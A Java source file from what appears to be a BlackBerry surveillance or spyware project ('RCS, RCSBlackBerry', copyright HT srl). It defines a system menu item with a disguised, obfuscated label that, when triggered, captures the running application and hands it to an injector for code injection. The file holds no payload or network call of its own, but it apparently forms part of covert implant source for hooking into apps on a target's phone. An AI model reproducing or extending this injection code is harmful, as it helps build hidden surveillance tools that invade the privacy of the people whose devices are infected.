//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import net.rim.device.api.ui.UiApplication;
import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.AInjector;

public class InjectorSystemMenu extends SystemMenu {
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectSysMenu", DebugLevel.VERBOSE);
    //#endif
    private InjectorManager manager;
    private AInjector injector;

    // g.8=Yield
    private String menuName = Messages.getString("g.8");

    protected String getMenuName() {
        return menuName;
    }

    protected void setMenuName(String menuName) {
        this.menuName = menuName;
    }

    public InjectorSystemMenu(InjectorManager manager, AInjector injector) {
        super(0);
        this.manager = manager;
        this.injector = injector;
        setMenuName(injector.getPreferredMenuName());
    }

    public Object run(Object context) {
        UiApplication app = UiApplication.getUiApplication();
        //#ifdef DEBUG
        debug.init();
        debug.trace("run on: " + app);
        //#endif

        injector.setInjectedApp(app);

        return null;
    }

}
